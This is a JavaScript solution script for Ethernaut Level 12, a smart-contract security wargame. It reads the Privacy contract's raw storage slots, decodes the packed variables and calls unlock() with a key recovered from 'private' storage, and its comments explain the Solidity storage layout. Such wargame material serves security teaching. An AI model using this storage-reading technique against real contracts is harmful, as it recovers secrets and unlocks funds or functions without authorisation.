/**
 * Code used to solve Level 12 of https://ethernaut.openzeppelin.com/.
 *
 * Runnable from https://remix.ethereum.org/.
 */
const PRIVACY_ADDR = "0x6EbB451dcD5FB327Ead694e9cBfb0e0EAE643217";
const PRIVACY_ABI = [
  {
    inputs: [
      {
        internalType: "bytes32[3]",
        name: "_data",
        type: "bytes32[3]",
      },
    ],
    stateMutability: "nonpayable",
    type: "constructor",
  },
  {
    inputs: [],
    name: "ID",
    outputs: [
      {
        internalType: "uint256",
        name: "",
        type: "uint256",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [],
    name: "locked",
    outputs: [
      {
        internalType: "bool",
        name: "",
        type: "bool",
      },
    ],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      {
        internalType: "bytes16",
        name: "_key",
        type: "bytes16",
      },
    ],
    name: "unlock",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

async function main() {
  const signer = new ethers.providers.Web3Provider(web3Provider).getSigner();
  const privacyContract = new ethers.Contract(
    PRIVACY_ADDR,
    PRIVACY_ABI,
    signer
  );

  try {
    // There are 6 variables stored in the contract, laid out in storage
    // according to
    // https://docs.soliditylang.org/en/v0.8.11/internals/layout_in_storage.html.

    // The first is `locked`, a boolean which uses one bit.
    const locked = web3.utils.hexToNumber(
      await web3.eth.getStorageAt(PRIVACY_ADDR, 0)
    )
      ? true
      : false;

    // The second is `ID`, a uint256 that takes a whole 32-byte slot.
    const ID = web3.utils.hexToNumber(
      await web3.eth.getStorageAt(PRIVACY_ADDR, 1)
    );

    // The third, fourth, and fifth variables are all packed together in one
    // slot.
    const packed = await web3.eth.getStorageAt(PRIVACY_ADDR, 2);
    const packedBytes = web3.utils.hexToBytes(packed);
    const packedBytesLength = packedBytes.length;
    // At the rightmost position in the slot, we have `flattening`, a uint8 that
    // takes one byte.
    const flattening = packedBytes[packedBytesLength - 1];
    // Then, we have `denomination`, a uint8 that takes another byte.
    const denomination = packedBytes[packedBytesLength - 2];
    // Finally, we have `awkwardness`, a uint16 that takes the rest of the slot.
    const awkwardness = web3.utils.hexToNumber(
      web3.utils.bytesToHex(packedBytes.slice(0, packedBytesLength - 2))
    );

    // The sixth variable is an array `data` of 3 bytes32 values which starts a
    // new slot. Since it's a fixed-size array, the data is stored contiguously.
    const data = [];
    for (let i = 3; i <= 5; i += 1) {
      data.push(await web3.eth.getStorageAt(PRIVACY_ADDR, i));
    }

    console.log({ locked, ID, flattening, denomination, awkwardness, data });

    // When you cast from bytes32 to bytes16, the rightmost 16 bytes will be
    // truncated, leaving only the leftmost 16 bytes.
    const bytes16data2 = web3.utils.bytesToHex(
      web3.utils.hexToBytes(data[2]).slice(0, 16)
    );

    await privacyContract.unlock(bytes16data2);
  } catch (err) {
    console.error("An error occurred:");
    console.error(err);
  }
}

main();
